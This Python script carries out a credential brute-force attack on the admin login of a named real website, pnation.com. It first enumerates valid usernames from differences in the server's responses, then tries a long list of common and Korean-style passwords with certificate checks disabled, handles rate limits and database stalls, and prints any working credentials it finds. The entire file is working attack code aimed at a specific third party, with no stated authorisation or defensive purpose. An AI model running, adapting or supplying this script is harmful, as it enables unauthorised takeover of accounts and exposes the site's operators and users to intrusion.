#!/usr/bin/env python3
"""Full brute force for pnation.com admin accounts"""
import requests, urllib3, time, sys
urllib3.disable_warnings()

TARGET = "https://pnation.com"

def try_login(user, pw, timeout=15):
    try:
        r = requests.post(f"{TARGET}/bbs/login_check.php",
            data={"mb_id": user, "mb_password": pw, "url": "https%3A%2F%2Fpnation.com"},
            verify=False, timeout=timeout, allow_redirects=False)
        if r.status_code == 302:
            return "SUCCESS", r.cookies.get_dict(), r.headers.get('Set-Cookie','')
        if "Connect Error" in r.text or "Too many" in r.text:
            return "db_down", None, None
        if len(r.text) < 100:
            return "no_user", None, None
        return "wrong", None, None
    except:
        return "timeout", None, None

# Step 1: Extended username enumeration
print("=== Step 1: Username Enumeration ===")
users = [
    "admin","master","pnation","psy","manager","root","webmaster",
    "administrator","test","user","operator","super","supervisor",
    "crush","shinee","heize","swings","dawn","hyuna",
    "psyadmin","adminpsy","pnadmin","psy1",
    "g5admin","gnuboard","adm","system",
    "info","support","help","contact",
    "hello","test1","tester","guest",
]
real = []
for u in users:
    r,_,_ = try_login(u, "x"*20, 10)
    if r in ("wrong", "SUCCESS"):
        real.append(u)
        print(f"  {u:15s} -> EXISTS")
    elif r == "db_down":
        print(f"  DB down, waiting...")
        time.sleep(3)
    else:
        pass  # no user
    time.sleep(0.2)

print(f"\nConfirmed users: {real}")

# Step 2: Brute force
print(f"\n=== Step 2: Brute Force ===")

pw_list = []
# Korean common
for n in range(4,9): pw_list.append("1"*n)
pw_list += ["1234","12345","123456","12345678","123456789","1234567890"]
pw_list += ["0000","000000","1111","2222","5555"]
pw_list += ["password","admin","admin123","admin1234","admin1","admins"]
pw_list += ["pnation","pnation123","pnation1","pnation2019","pnation2024"]
pw_list += ["psy123","psy1234","psy12345","psypsy","gangnam","psyadmin"]
pw_list += ["dkssud","dkssudgktpdy","rhksflwk","gksrnr","ekdms","wlstn"]
pw_list += ["qwer1234","1q2w3e4r","zxcv1234","asdf1234"]
pw_list += ["a123456","a123456789","qwerty","iloveyou","incheon"]
pw_list += ["Psy","Psy123","PSY123","PSY","gnuboard5"]
pw_list += ["qwer","asdf","zxcv","abcd","abc123","abcd1234"]
pw_list += ["korea123","seoul123","love123","test123"]
pw_list += ["123","qwerty123","password123"]

# Deduplicate
pw_list = list(dict.fromkeys(pw_list))

for user in real:
    print(f"\n  [{user}] ({len(pw_list)} passwords)")
    for pw in pw_list:
        r,_,_ = try_login(user, pw, 12)
        if r == "SUCCESS":
            print(f"\n\n    >>> FOUND: {user}:{pw} <<<")
            sys.exit(0)
        elif r == "wrong":
            pass
        elif r == "db_down":
            print(f"    DB down, wait...")
            time.sleep(3)
        elif r == "timeout":
            time.sleep(1)
        time.sleep(0.15)

print("\nNo valid creds found")
